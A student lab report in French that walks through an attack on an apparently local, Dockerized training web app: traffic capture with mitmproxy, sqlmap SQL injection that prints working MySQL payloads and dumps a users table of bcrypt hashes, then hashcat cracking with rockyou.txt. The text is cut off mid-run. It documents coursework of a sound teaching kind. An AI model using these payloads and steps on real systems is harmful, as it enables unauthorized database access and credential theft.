# Rapport TP Attaque/defense

By Clement ALLEGRE--COMMINGES and PETIT Lucien

## Sommaire

## Introduction

## 1. mise en place serveur proxy mitm

```bash
user@motivation:~/Documents $ sudo apt install mitmproxy

user@motivation:~/Documents $ docker network inspect bridge
[
    {
        "Name": "bridge",
        "Id": "2fde6a211bd9b871c645ad466f740567082be3eef0eebc39aad5e6bf581b1171",
        "Created": "2025-12-08T07:40:12.285337437Z",
        "Scope": "local",
        "Driver": "bridge",
        "EnableIPv4": true,
        "EnableIPv6": false,
        "IPAM": {
            "Driver": "default",
            "Options": null,
            "Config": [
                {
                    "Subnet": "172.17.0.0/16",
                    "IPRange": "",
                    "Gateway": "172.17.0.1"
                }
            ]
        },
        "Internal": false,
        "Attachable": false,
        "Ingress": false,
        "ConfigFrom": {
            "Network": ""
        },
        "ConfigOnly": false,
        "Options": {
            "com.docker.network.bridge.default_bridge": "true",
            "com.docker.network.bridge.enable_icc": "true",
            "com.docker.network.bridge.enable_ip_masquerade": "true",
            "com.docker.network.bridge.host_binding_ipv4": "0.0.0.0",
            "com.docker.network.bridge.name": "docker0",
            "com.docker.network.driver.mtu": "1500"
        },
        "Labels": {},
        "Containers": {
            "3104e4742370b55669fe5d1205edcfab2519f9598376a1aa54450e078710efb5": {
                "Name": "web_time",
                "EndpointID": "fc508deaa6f4df1d2181e96d5f15ac9372555e1712900a1c9e141767bde342bd",
                "MacAddress": "d6:43:7a:03:7c:90",
                "IPv4Address": "172.17.0.3/16",
                "IPv6Address": ""
            },
            "f73dbc04cab519ef83425de189f71651ff5bfc600c4f525d7a91ce9c5be322ca": {
                "Name": "web_korp_terminal",
                "EndpointID": "5a146cd336180af34f4b5fa526b422ec2078bc92fa1181dd609dc255d8fe1580",
                "MacAddress": "aa:05:44:62:b9:ed",
                "IPv4Address": "172.17.0.2/16",
                "IPv6Address": ""
            }
        },
        "Status": {
            "IPAM": {
                "Subnets": {
                    "172.17.0.0/16": {
                        "IPsInUse": 5,
                        "DynamicIPsAvailable": 65531
                    }
                }
            }
        }
    }
]



user@motivation:~/.mitmproxy $ docker ps
CONTAINER ID   IMAGE                 COMMAND                  CREATED             STATUS             PORTS                                                   NAMES
245b900a0e96   mitmproxy/mitmproxy   "docker-entrypoint.s…"   5 minutes ago       Up 5 minutes       0.0.0.0:8080->8080/tcp, [::]:8080->8080/tcp, 8081/tcp   crazy_wing
f73dbc04cab5   web_korp_terminal     "/entrypoint.sh"         About an hour ago   Up About an hour   0.0.0.0:1337->1337/tcp, [::]:1337->1337/tcp             web_korp_terminal
```

```mermaid
graph LR
A[WebApp client]<-->  |port: 1337       port: 8080| B[Man in the Midel]
B[MitmProxy] <--> |port: 8080       port:1337 | C[WebApp Terminal]
```

Lancement du client:

```bash
user@motivation:~/Documents/sqlmap-dev $ http_proxy=http://127.0.0.1:8080 lynx http://172.17.0.3:1337
```

![Alt text](./image/login.png)

Pour lancer le mitm :

```bash
user@motivation:~ $ docker run --rm -it -v ~/.mitmproxy:/home/mitmproxy/.mitmproxy -p 8080:8080 mitmproxy/mitmproxy mitmdump --flow-detail 3 -w4 -w /home/mitmproxy/.mitmproxy/test.txt
```

Pour lancer le service Terminal Korp:

```bash

```

## 2. dump des communication entre client est serveur

Ensuite faire une tentative de connexion avec un user name et mot de passe aléatoire pour communiquer avec le serveur terminal Korp.

Cela permettra au mitmproxy de nous retourner des information que l'ont exploitera ensuite.

```bash

user@motivation:~/.mitmproxy $ cat test.txt
POST http://172.17.0.3:1337/?username=user&password=password HTTP/1.0
Host: 172.17.0.3:1337
Accept: text/html, text/plain, text/sgml, text/css, */*;q=0.01
Accept-Encoding: gzip, compress, bzip2
Accept-Language: en
Pragma: no-cache
Cache-Control: no-cache
User-Agent: Lynx/2.9.0dev.12 libwww-FM/2.14 SSL-MM/1.4.1 GNUTLS/3.7.8
Referer: http://172.17.0.3:1337/
Content-Type: application/x-www-form-urlencoded
Content-Length: 31

username=user&password=password

<< HTTP/1.1 401 UNAUTHORIZED 39b
Server: Werkzeug/3.1.4 Python/3.12.12
Date: Tue, 09 Dec 2025 16:19:58 GMT
Content-Type: application/json
Content-Length: 39
Connection: close

{
"message": "Invalid user or password"
}

```

## 3. utilisation du dump avec sqlmap pour recupéré la description des tables

```bash
user@motivation:~/Documents/sqlmap-dev $ python sqlmap.py -r /home/user/.mitmproxy/test.txt --ignore-code 401 -p username --tables
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.9.12.3#dev}
|_ -| . [.]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 16:39:35 /2025-12-09/

[16:39:35] [INFO] parsing HTTP request from '/home/user/.mitmproxy/test.txt'
[16:39:36] [INFO] resuming back-end DBMS 'mysql'
[16:39:36] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: username=user' RLIKE (SELECT (CASE WHEN (8098=8098) THEN 0x75736572 ELSE 0x28 END))-- uAoT&password=password

<< HTTP/1.1 401 UNAUTHORIZED 39b
Server: Werkzeug/3.1.4 Python/3.12.12
Date: Tue, 09 Dec 2025 16:19:58 GMT
Content-Type: application/json
Content-Length: 39
Connection: close

{
"message": "Invalid user or password"
}

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: username=user' AND (SELECT 9045 FROM(SELECT COUNT(*),CONCAT(0x716b766b71,(SELECT (ELT(9045=9045,1))),0x7178707071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- MGMf&password=password

<< HTTP/1.1 401 UNAUTHORIZED 39b
Server: Werkzeug/3.1.4 Python/3.12.12
Date: Tue, 09 Dec 2025 16:19:58 GMT
Content-Type: application/json
Content-Length: 39
Connection: close

{
"message": "Invalid user or password"
}

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=user' AND (SELECT 4340 FROM (SELECT(SLEEP(5)))THqE)-- FTYa&password=password

<< HTTP/1.1 401 UNAUTHORIZED 39b
Server: Werkzeug/3.1.4 Python/3.12.12
Date: Tue, 09 Dec 2025 16:19:58 GMT
Content-Type: application/json
Content-Length: 39
Connection: close

{
"message": "Invalid user or password"
}
---
[16:39:36] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[16:39:36] [INFO] fetching database names
[16:39:36] [INFO] retrieved: 'information_schema'
[16:39:37] [INFO] retrieved: 'test'
[16:39:37] [INFO] retrieved: 'korp_terminal'
[16:39:37] [INFO] fetching tables for databases: 'information_schema, korp_terminal, test'
[16:39:37] [INFO] retrieved: 'information_schema'
[16:39:37] [INFO] retrieved: 'ALL_PLUGINS'
[16:39:37] [INFO] retrieved: 'information_schema'
[16:39:38] [INFO] retrieved: 'APPLICABLE_ROLES'
[16:39:38] [INFO] retrieved: 'information_schema'
[16:39:38] [INFO] retrieved: 'CHARACTER_SETS'
[16:39:38] [INFO] retrieved: 'information_schema'
[16:39:38] [INFO] retrieved: 'CHECK_CONSTRAINTS'
[16:39:38] [INFO] retrieved: 'information_schema'
[16:39:38] [INFO] retrieved: 'COLLATIONS'
[16:39:38] [INFO] retrieved: 'information_schema'
[16:39:39] [INFO] retrieved: 'COLLATION_CHARACTER_SET_APPLICABILITY'
[16:39:39] [INFO] retrieved: 'information_schema'
[16:39:39] [INFO] retrieved: 'COLUMNS'
[16:39:39] [INFO] retrieved: 'information_schema'
[16:39:39] [INFO] retrieved: 'COLUMN_PRIVILEGES'
[16:39:39] [INFO] retrieved: 'information_schema'
[16:39:40] [INFO] retrieved: 'ENABLED_ROLES'
[16:39:40] [INFO] retrieved: 'information_schema'
[16:39:40] [INFO] retrieved: 'ENGINES'
[16:39:40] [INFO] retrieved: 'information_schema'
[16:39:40] [INFO] retrieved: 'EVENTS'
[16:39:40] [INFO] retrieved: 'information_schema'
[16:39:40] [INFO] retrieved: 'FILES'
[16:39:41] [INFO] retrieved: 'information_schema'
[16:39:41] [INFO] retrieved: 'GLOBAL_STATUS'
[16:39:41] [INFO] retrieved: 'information_schema'
[16:39:41] [INFO] retrieved: 'GLOBAL_VARIABLES'
[16:39:41] [INFO] retrieved: 'information_schema'
[16:39:41] [INFO] retrieved: 'KEYWORDS'
[16:39:41] [INFO] retrieved: 'information_schema'
[16:39:42] [INFO] retrieved: 'KEY_CACHES'
[16:39:42] [INFO] retrieved: 'information_schema'
[16:39:42] [INFO] retrieved: 'KEY_COLUMN_USAGE'
[16:39:42] [INFO] retrieved: 'information_schema'
[16:39:42] [INFO] retrieved: 'KEY_PERIOD_USAGE'
[16:39:42] [INFO] retrieved: 'information_schema'
[16:39:42] [INFO] retrieved: 'OPTIMIZER_COSTS'
[16:39:43] [INFO] retrieved: 'information_schema'
[16:39:43] [INFO] retrieved: 'OPTIMIZER_TRACE'
[16:39:43] [INFO] retrieved: 'information_schema'
[16:39:43] [INFO] retrieved: 'PARAMETERS'
[16:39:43] [INFO] retrieved: 'information_schema'
[16:39:43] [INFO] retrieved: 'PARTITIONS'
[16:39:43] [INFO] retrieved: 'information_schema'
[16:39:44] [INFO] retrieved: 'PERIODS'
[16:39:44] [INFO] retrieved: 'information_schema'
[16:39:44] [INFO] retrieved: 'PLUGINS'
[16:39:44] [INFO] retrieved: 'information_schema'
[16:39:44] [INFO] retrieved: 'PROCESSLIST'
[16:39:44] [INFO] retrieved: 'information_schema'
[16:39:44] [INFO] retrieved: 'PROFILING'
[16:39:45] [INFO] retrieved: 'information_schema'
[16:39:45] [INFO] retrieved: 'REFERENTIAL_CONSTRAINTS'
[16:39:45] [INFO] retrieved: 'information_schema'
[16:39:45] [INFO] retrieved: 'ROUTINES'
[16:39:45] [INFO] retrieved: 'information_schema'
[16:39:45] [INFO] retrieved: 'SCHEMATA'
[16:39:45] [INFO] retrieved: 'information_schema'
[16:39:46] [INFO] retrieved: 'SCHEMA_PRIVILEGES'
[16:39:46] [INFO] retrieved: 'information_schema'
[16:39:46] [INFO] retrieved: 'SESSION_STATUS'
[16:39:46] [INFO] retrieved: 'information_schema'
[16:39:46] [INFO] retrieved: 'SESSION_VARIABLES'
[16:39:46] [INFO] retrieved: 'information_schema'
[16:39:46] [INFO] retrieved: 'STATISTICS'
[16:39:47] [INFO] retrieved: 'information_schema'
[16:39:47] [INFO] retrieved: 'SQL_FUNCTIONS'
[16:39:47] [INFO] retrieved: 'information_schema'
[16:39:47] [INFO] retrieved: 'SYSTEM_VARIABLES'
[16:39:47] [INFO] retrieved: 'information_schema'
[16:39:47] [INFO] retrieved: 'TABLES'
[16:39:47] [INFO] retrieved: 'information_schema'
[16:39:48] [INFO] retrieved: 'TABLESPACES'
[16:39:48] [INFO] retrieved: 'information_schema'
[16:39:48] [INFO] retrieved: 'TABLE_CONSTRAINTS'
[16:39:48] [INFO] retrieved: 'information_schema'
[16:39:48] [INFO] retrieved: 'TABLE_PRIVILEGES'
[16:39:48] [INFO] retrieved: 'information_schema'
[16:39:48] [INFO] retrieved: 'TRIGGERS'
[16:39:49] [INFO] retrieved: 'information_schema'
[16:39:49] [INFO] retrieved: 'USER_PRIVILEGES'
[16:39:49] [INFO] retrieved: 'information_schema'
[16:39:49] [INFO] retrieved: 'VIEWS'
[16:39:49] [INFO] retrieved: 'information_schema'
[16:39:49] [INFO] retrieved: 'CLIENT_STATISTICS'
[16:39:49] [INFO] retrieved: 'information_schema'
[16:39:50] [INFO] retrieved: 'INDEX_STATISTICS'
[16:39:50] [INFO] retrieved: 'information_schema'
[16:39:50] [INFO] retrieved: 'INNODB_FT_CONFIG'
[16:39:50] [INFO] retrieved: 'information_schema'
[16:39:50] [INFO] retrieved: 'GEOMETRY_COLUMNS'
[16:39:50] [INFO] retrieved: 'information_schema'
[16:39:51] [INFO] retrieved: 'INNODB_SYS_TABLESTATS'
[16:39:51] [INFO] retrieved: 'information_schema'
[16:39:51] [INFO] retrieved: 'SPATIAL_REF_SYS'
[16:39:51] [INFO] retrieved: 'information_schema'
[16:39:51] [INFO] retrieved: 'USER_STATISTICS'
[16:39:51] [INFO] retrieved: 'information_schema'
[16:39:51] [INFO] retrieved: 'INNODB_TRX'
[16:39:52] [INFO] retrieved: 'information_schema'
[16:39:52] [INFO] retrieved: 'INNODB_CMP_PER_INDEX'
[16:39:52] [INFO] retrieved: 'information_schema'
[16:39:52] [INFO] retrieved: 'INNODB_METRICS'
[16:39:52] [INFO] retrieved: 'information_schema'
[16:39:52] [INFO] retrieved: 'INNODB_FT_DELETED'
[16:39:52] [INFO] retrieved: 'information_schema'
[16:39:53] [INFO] retrieved: 'INNODB_CMP'
[16:39:53] [INFO] retrieved: 'information_schema'
[16:39:53] [INFO] retrieved: 'THREAD_POOL_WAITS'
[16:39:53] [INFO] retrieved: 'information_schema'
[16:39:53] [INFO] retrieved: 'INNODB_CMP_RESET'
[16:39:53] [INFO] retrieved: 'information_schema'
[16:39:53] [INFO] retrieved: 'THREAD_POOL_QUEUES'
[16:39:54] [INFO] retrieved: 'information_schema'
[16:39:54] [INFO] retrieved: 'TABLE_STATISTICS'
[16:39:54] [INFO] retrieved: 'information_schema'
[16:39:54] [INFO] retrieved: 'INNODB_SYS_FIELDS'
[16:39:54] [INFO] retrieved: 'information_schema'
[16:39:54] [INFO] retrieved: 'INNODB_BUFFER_PAGE_LRU'
[16:39:54] [INFO] retrieved: 'information_schema'
[16:39:55] [INFO] retrieved: 'INNODB_LOCKS'
[16:39:55] [INFO] retrieved: 'information_schema'
[16:39:55] [INFO] retrieved: 'INNODB_FT_INDEX_TABLE'
[16:39:55] [INFO] retrieved: 'information_schema'
[16:39:55] [INFO] retrieved: 'INNODB_CMPMEM'
[16:39:55] [INFO] retrieved: 'information_schema'
[16:39:55] [INFO] retrieved: 'THREAD_POOL_GROUPS'
[16:39:56] [INFO] retrieved: 'information_schema'
[16:39:56] [INFO] retrieved: 'INNODB_CMP_PER_INDEX_RESET'
[16:39:56] [INFO] retrieved: 'information_schema'
[16:39:56] [INFO] retrieved: 'INNODB_SYS_FOREIGN_COLS'
[16:39:56] [INFO] retrieved: 'information_schema'
[16:39:56] [INFO] retrieved: 'INNODB_FT_INDEX_CACHE'
[16:39:56] [INFO] retrieved: 'information_schema'
[16:39:57] [INFO] retrieved: 'INNODB_BUFFER_POOL_STATS'
[16:39:57] [INFO] retrieved: 'information_schema'
[16:39:57] [INFO] retrieved: 'INNODB_FT_BEING_DELETED'
[16:39:57] [INFO] retrieved: 'information_schema'
[16:39:57] [INFO] retrieved: 'INNODB_SYS_FOREIGN'
[16:39:57] [INFO] retrieved: 'information_schema'
[16:39:57] [INFO] retrieved: 'INNODB_CMPMEM_RESET'
[16:39:58] [INFO] retrieved: 'information_schema'
[16:39:58] [INFO] retrieved: 'INNODB_FT_DEFAULT_STOPWORD'
[16:39:58] [INFO] retrieved: 'information_schema'
[16:39:58] [INFO] retrieved: 'INNODB_SYS_TABLES'
[16:39:58] [INFO] retrieved: 'information_schema'
[16:39:58] [INFO] retrieved: 'INNODB_SYS_COLUMNS'
[16:39:58] [INFO] retrieved: 'information_schema'
[16:39:59] [INFO] retrieved: 'INNODB_SYS_TABLESPACES'
[16:39:59] [INFO] retrieved: 'information_schema'
[16:39:59] [INFO] retrieved: 'INNODB_SYS_INDEXES'
[16:39:59] [INFO] retrieved: 'information_schema'
[16:39:59] [INFO] retrieved: 'INNODB_BUFFER_PAGE'
[16:39:59] [INFO] retrieved: 'information_schema'
[16:40:00] [INFO] retrieved: 'INNODB_SYS_VIRTUAL'
[16:40:00] [INFO] retrieved: 'information_schema'
[16:40:00] [INFO] retrieved: 'user_variables'
[16:40:00] [INFO] retrieved: 'information_schema'
[16:40:00] [INFO] retrieved: 'INNODB_TABLESPACES_ENCRYPTION'
[16:40:00] [INFO] retrieved: 'information_schema'
[16:40:00] [INFO] retrieved: 'INNODB_LOCK_WAITS'
[16:40:01] [INFO] retrieved: 'information_schema'
[16:40:01] [INFO] retrieved: 'THREAD_POOL_STATS'
[16:40:01] [INFO] retrieved: 'korp_terminal'
[16:40:01] [INFO] retrieved: 'users'
Database: information_schema
[82 tables]
+---------------------------------------+
| ALL_PLUGINS                           |
| APPLICABLE_ROLES                      |
| CHARACTER_SETS                        |
| CHECK_CONSTRAINTS                     |
| CLIENT_STATISTICS                     |
| COLLATIONS                            |
| COLLATION_CHARACTER_SET_APPLICABILITY |
| COLUMN_PRIVILEGES                     |
| ENABLED_ROLES                         |
| FILES                                 |
| GEOMETRY_COLUMNS                      |
| GLOBAL_STATUS                         |
| GLOBAL_VARIABLES                      |
| INDEX_STATISTICS                      |
| INNODB_BUFFER_PAGE                    |
| INNODB_BUFFER_PAGE_LRU                |
| INNODB_BUFFER_POOL_STATS              |
| INNODB_CMP                            |
| INNODB_CMPMEM                         |
| INNODB_CMPMEM_RESET                   |
| INNODB_CMP_PER_INDEX                  |
| INNODB_CMP_PER_INDEX_RESET            |
| INNODB_CMP_RESET                      |
| INNODB_FT_BEING_DELETED               |
| INNODB_FT_CONFIG                      |
| INNODB_FT_DEFAULT_STOPWORD            |
| INNODB_FT_DELETED                     |
| INNODB_FT_INDEX_CACHE                 |
| INNODB_FT_INDEX_TABLE                 |
| INNODB_LOCKS                          |
| INNODB_LOCK_WAITS                     |
| INNODB_METRICS                        |
| INNODB_SYS_COLUMNS                    |
| INNODB_SYS_FIELDS                     |
| INNODB_SYS_FOREIGN                    |
| INNODB_SYS_FOREIGN_COLS               |
| INNODB_SYS_INDEXES                    |
| INNODB_SYS_TABLES                     |
| INNODB_SYS_TABLESPACES                |
| INNODB_SYS_TABLESTATS                 |
| INNODB_SYS_VIRTUAL                    |
| INNODB_TABLESPACES_ENCRYPTION         |
| INNODB_TRX                            |
| KEYWORDS                              |
| KEY_CACHES                            |
| KEY_COLUMN_USAGE                      |
| KEY_PERIOD_USAGE                      |
| OPTIMIZER_TRACE                       |
| PARAMETERS                            |
| PERIODS                               |
| PROFILING                             |
| REFERENTIAL_CONSTRAINTS               |
| ROUTINES                              |
| SCHEMATA                              |
| SCHEMA_PRIVILEGES                     |
| SESSION_STATUS                        |
| SESSION_VARIABLES                     |
| SPATIAL_REF_SYS                       |
| SQL_FUNCTIONS                         |
| STATISTICS                            |
| SYSTEM_VARIABLES                      |
| TABLESPACES                           |
| TABLE_CONSTRAINTS                     |
| TABLE_PRIVILEGES                      |
| TABLE_STATISTICS                      |
| THREAD_POOL_GROUPS                    |
| THREAD_POOL_QUEUES                    |
| THREAD_POOL_STATS                     |
| THREAD_POOL_WAITS                     |
| USER_PRIVILEGES                       |
| USER_STATISTICS                       |
| VIEWS                                 |
| COLUMNS                               |
| ENGINES                               |
| EVENTS                                |
| OPTIMIZER_COSTS                       |
| PARTITIONS                            |
| PLUGINS                               |
| PROCESSLIST                           |
| TABLES                                |
| TRIGGERS                              |
| user_variables                        |
+---------------------------------------+

Database: korp_terminal
[1 table]
+---------------------------------------+
| users                                 |
+---------------------------------------+

[16:40:01] [WARNING] HTTP error codes detected during run:
401 (Unauthorized) - 1 times, 500 (Internal Server Error) - 171 times
[16:40:01] [INFO] fetched data logged to text files under '/home/user/.local/share/sqlmap/output/172.17.0.3'

[*] ending @ 16:40:01 /2025-12-09/
```

## 4. Utilisation de sqlmap pour récupérer les tables cibles (user, password)

```bash
user@motivation:~/Documents/sqlmap-dev $ python sqlmap.py -r /home/user/.mitmproxy/test.txt -D korp_terminal -T users --columns --ignore-code 401
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.9.12.3#dev}
|_ -| . [,]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 16:46:18 /2025-12-09/

[16:46:18] [INFO] parsing HTTP request from '/home/user/.mitmproxy/test.txt'
[16:46:19] [INFO] resuming back-end DBMS 'mysql'
[16:46:19] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: username=user' RLIKE (SELECT (CASE WHEN (8098=8098) THEN 0x75736572 ELSE 0x28 END))-- uAoT&password=password

<< HTTP/1.1 401 UNAUTHORIZED 39b
Server: Werkzeug/3.1.4 Python/3.12.12
Date: Tue, 09 Dec 2025 16:19:58 GMT
Content-Type: application/json
Content-Length: 39
Connection: close

{
"message": "Invalid user or password"
}

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: username=user' AND (SELECT 9045 FROM(SELECT COUNT(*),CONCAT(0x716b766b71,(SELECT (ELT(9045=9045,1))),0x7178707071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- MGMf&password=password

<< HTTP/1.1 401 UNAUTHORIZED 39b
Server: Werkzeug/3.1.4 Python/3.12.12
Date: Tue, 09 Dec 2025 16:19:58 GMT
Content-Type: application/json
Content-Length: 39
Connection: close

{
"message": "Invalid user or password"
}

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=user' AND (SELECT 4340 FROM (SELECT(SLEEP(5)))THqE)-- FTYa&password=password

<< HTTP/1.1 401 UNAUTHORIZED 39b
Server: Werkzeug/3.1.4 Python/3.12.12
Date: Tue, 09 Dec 2025 16:19:58 GMT
Content-Type: application/json
Content-Length: 39
Connection: close

{
"message": "Invalid user or password"
}
---
[16:46:19] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[16:46:19] [INFO] fetching columns for table 'users' in database 'korp_terminal'
[16:46:19] [INFO] retrieved: 'id'
[16:46:20] [INFO] retrieved: 'int(11)'
[16:46:20] [INFO] retrieved: 'username'
[16:46:20] [INFO] retrieved: 'varchar(255)'
[16:46:20] [INFO] retrieved: 'password'
[16:46:20] [INFO] retrieved: 'varchar(255)'
Database: korp_terminal
Table: users
[3 columns]
+----------+--------------+
| Column   | Type         |
+----------+--------------+
| id       | int(11)      |
| password | varchar(255) |
| username | varchar(255) |
+----------+--------------+

[16:46:20] [WARNING] HTTP error codes detected during run:
401 (Unauthorized) - 1 times, 500 (Internal Server Error) - 7 times
[16:46:20] [INFO] fetched data logged to text files under '/home/user/.local/share/sqlmap/output/172.17.0.3'

[*] ending @ 16:46:20 /2025-12-09/






user@motivation:~/Documents/sqlmap-dev $ python sqlmap.py -r /home/user/.mitmproxy/test.txt -D korp_terminal -T users -C username,password --dump --igno
re-code 401
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.9.12.3#dev}
|_ -| . ["]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 16:50:03 /2025-12-09/

[16:50:03] [INFO] parsing HTTP request from '/home/user/.mitmproxy/test.txt'
[16:50:03] [INFO] resuming back-end DBMS 'mysql'
[16:50:03] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: username=user' RLIKE (SELECT (CASE WHEN (8098=8098) THEN 0x75736572 ELSE 0x28 END))-- uAoT&password=password

<< HTTP/1.1 401 UNAUTHORIZED 39b
Server: Werkzeug/3.1.4 Python/3.12.12
Date: Tue, 09 Dec 2025 16:19:58 GMT
Content-Type: application/json
Content-Length: 39
Connection: close

{
"message": "Invalid user or password"
}

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: username=user' AND (SELECT 9045 FROM(SELECT COUNT(*),CONCAT(0x716b766b71,(SELECT (ELT(9045=9045,1))),0x7178707071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- MGMf&password=password

<< HTTP/1.1 401 UNAUTHORIZED 39b
Server: Werkzeug/3.1.4 Python/3.12.12
Date: Tue, 09 Dec 2025 16:19:58 GMT
Content-Type: application/json
Content-Length: 39
Connection: close

{
"message": "Invalid user or password"
}

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=user' AND (SELECT 4340 FROM (SELECT(SLEEP(5)))THqE)-- FTYa&password=password

<< HTTP/1.1 401 UNAUTHORIZED 39b
Server: Werkzeug/3.1.4 Python/3.12.12
Date: Tue, 09 Dec 2025 16:19:58 GMT
Content-Type: application/json
Content-Length: 39
Connection: close

{
"message": "Invalid user or password"
}
---
[16:50:04] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[16:50:04] [INFO] fetching entries of column(s) 'password,username' for table 'users' in database 'korp_terminal'
[16:50:04] [INFO] retrieved: '$2y$10$1vSdN5jTa5S0ybMs.FXUwemfLxeBYGgjGsTD...
[16:50:04] [INFO] retrieved: 'test'
[16:50:05] [INFO] retrieved: '$2y$10$bfni4oATx18uvyU9Aff8yuoXkjubqZyksIrj...
[16:50:05] [INFO] retrieved: 'user'
[16:50:05] [INFO] retrieved: '$2y$10$p34l3lUN9bZKhnT1.e891Ow.nrQnT7V73vt....
[16:50:05] [INFO] retrieved: 'admin'
Database: korp_terminal
Table: users
[3 entries]
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| test     | $2y$10$1vSdN5jTa5S0ybMs.FXUwemfLxeBYGgjGsTDis.fuD6mx0lq9tLNe |
| user     | $2y$10$bfni4oATx18uvyU9Aff8yuoXkjubqZyksIrj9zkSOwAYTBmN4Zroi |
| admin    | $2y$10$p34l3lUN9bZKhnT1.e891Ow.nrQnT7V73vt.IuOvfZH1Jygxsxps6 |
+----------+--------------------------------------------------------------+

[16:50:05] [INFO] table 'korp_terminal.users' dumped to CSV file '/home/user/.local/share/sqlmap/output/172.17.0.3/dump/korp_terminal/users.csv'
[16:50:05] [WARNING] HTTP error codes detected during run:
401 (Unauthorized) - 1 times, 500 (Internal Server Error) - 10 times
[16:50:05] [INFO] fetched data logged to text files under '/home/user/.local/share/sqlmap/output/172.17.0.3'

[*] ending @ 16:50:05 /2025-12-09/





user@motivation:~/Documents $ cat users
test:$2y$10$1vSdN5jTa5S0ybMs.FXUwemfLxeBYGgjGsTDis.fuD6mx0lq9tLNe
user:$2y$10$bfni4oATx18uvyU9Aff8yuoXkjubqZyksIrj9zkSOwAYTBmN4Zroi
admin:$2y$10$p34l3lUN9bZKhnT1.e891Ow.nrQnT7V73vt.IuOvfZH1Jygxsxps6
```

## 5. Utilisation de hascat pour retrouver les mot de passe associer aux hashs

```bash
user@DESKTOP-5QE5MM5:~$ sudo gzip -d rockyou.txt.gz


user@DESKTOP-5QE5MM5:~$ hashcat -m 3200 users rockyou.txt
hashcat (v6.2.6) starting

* Device #1: WARNING! Kernel exec timeout is not disabled.
             This may cause "CL_OUT_OF_RESOURCES" or related errors.
             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
nvmlDeviceGetFanSpeed(): Not Supported

CUDA API (CUDA 13.0)
====================
* Device #1: NVIDIA GeForce RTX 2060, 5105/6143 MB, 30MCU

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #2: cpu-haswell-Intel(R) Core(TM) i5-9300H CPU @ 2.40GHz, 2874/5812 MB (1024 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72

Hashfile 'users' on line 1 (test:$...emfLxeBYGgjGsTDis.fuD6mx0lq9tLNe): Token length exception
Hashfile 'users' on line 2 (user:$...uoXkjubqZyksIrj9zkSOwAYTBmN4Zroi): Token length exception
Hashfile 'users' on line 3 (admin:...Ow.nrQnT7V73vt.IuOvfZH1Jygxsxps6): Token length exception

* Token length exception: 3/3 hashes
  This error happens if the wrong hash type is specified, if the hashes are
  malformed, or if input is otherwise not as expected (for example, if the
  --username option is used but no username is present)

No hashes loaded.

Started: Tue Dec  9 18:04:18 2025
Stopped: Tue Dec  9 18:04:20 2025
user@DESKTOP-5QE5MM5:~$ hashcat -m 3200 users rockyou.txt --user
hashcat (v6.2.6) starting

* Device #1: WARNING! Kernel exec timeout is not disabled.
             This may cause "CL_OUT_OF_RESOURCES" or related errors.
             To disable the timeout, see: https://hashcat.net/q/timeoutpatch
nvmlDeviceGetFanSpeed(): Not Supported

CUDA API (CUDA 13.0)
====================
* Device #1: NVIDIA GeForce RTX 2060, 5105/6143 MB, 30MCU

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
